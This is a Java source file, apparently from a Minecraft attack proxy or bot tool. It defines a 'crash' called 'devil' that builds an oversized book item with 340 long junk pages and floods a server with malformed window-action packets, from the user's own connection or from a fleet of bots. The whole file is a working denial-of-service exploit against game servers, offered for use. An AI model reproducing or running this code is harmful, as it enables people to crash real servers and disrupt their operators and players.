package pl.venixpll.system.crash.impl;

import net.minecraft.nbt.NBTBase;
import net.minecraft.nbt.NBTTagCompound;
import net.minecraft.nbt.NBTTagList;
import net.minecraft.nbt.NBTTagString;
import pl.venixpll.mc.data.game.WindowAction;
import pl.venixpll.mc.data.item.ItemStack;
import pl.venixpll.mc.objects.Player;
import pl.venixpll.mc.packet.Packet;
import pl.venixpll.mc.packet.impl.client.play.ClientPlayerWindowActionPacket;
import pl.venixpll.system.crash.Crash;
import pl.venixpll.system.crash.CrashType;

import java.util.List;
import java.util.stream.Collectors;
import java.util.stream.IntStream;

public class CrashDevil extends Crash {
    public CrashDevil() {
        super("devil",CrashType.NBT);
    }

    private Packet packet;

    @Override
    public void init() {

        final NBTTagCompound compound = new NBTTagCompound();

        final List<NBTBase> list = IntStream.range(0, 340)
                .mapToObj(ia -> new NBTTagString("fY7rukOvd5cgZJ2uLWKWg0yzX5Ps6mcGmZAIIw60Xl90X8NuWnvxif28WAfoaDY6ey5JyedGJ611a8HdevuGvriJsg98hnczdxvzd9zE6A1cbkJ2eJtBKaRB068fdrMk0OKxkpnseVYeYkautyZGEcF3D3gzspWY15o8T94u0oniWIhPknP2nsW9vvSn62i0wtY8NLFbc5jW9tFpHTH52bGBd5cHHTt8F92XtENE6vsA0IjNWEHdXCgFZetgNdlRpxCwFNfnlC0HGiZnyRTpHH33CyOYTYBxnkoXIbELzKsrBz6h3tv4TzYjGTIgDHduKCLYM3kCegwKaMoXukSSvJHhhKblSmvwEXENN7naxPuZiIX34Ka28GeGmLdRCBxKuNZyH4P2Ovf25jjSrER33uDBBAB3rJuBpuTLb1xO0MhLueor84kJ3MDkDCuPxhmleA2SPR7fp6wCxXd4g8aKmuEHBskFRrrADVC7hxMC2HsNfJxjKuAm"))
                .collect(Collectors.toList());

        final NBTTagList pages = new NBTTagList();
        list.forEach(pages::appendTag);

        compound.setTag("pages",pages);
        compound.setTag("title",new NBTTagString("eH70axevNpWBzL"));
        compound.setTag("author",new NBTTagString("QerxA39453"));

        final ItemStack itemStack = new ItemStack(386, 1, 0, compound);
        this.packet = new ClientPlayerWindowActionPacket(-1,(short)-1,2, WindowAction.DROP_ITEM,-1,itemStack);
    }

    @Override
    public void execute(String message, Player sender) {

        if(packet == null){
            sender.sendChatMessage("&cFailed to initialize crash!");
            return;
        }

        try {
            final String[] args = message.split(" ");
            final int amount = Integer.parseInt(args[2]);
            if (sender.getBots().size() == 0) {
                IntStream.range(0,amount).forEach(i -> sender.getConnector().sendPacket(packet));
                sender.sendChatMessage("&aCrashing complete! &8(&6USER&8)");
            } else {
                sender.getBots().forEach(b -> IntStream.range(0,amount).forEach(i -> b.getConnection().sendPacket(packet)));
                sender.sendChatMessage("&aCrashing complete! &8(&6BOTS&8)");
            }
        }catch(final Throwable t){
            sender.sendChatMessage("&cError occured during crashing! &8(&6" + t.getClass().getSimpleName() + "&8)");
        }
    }
}
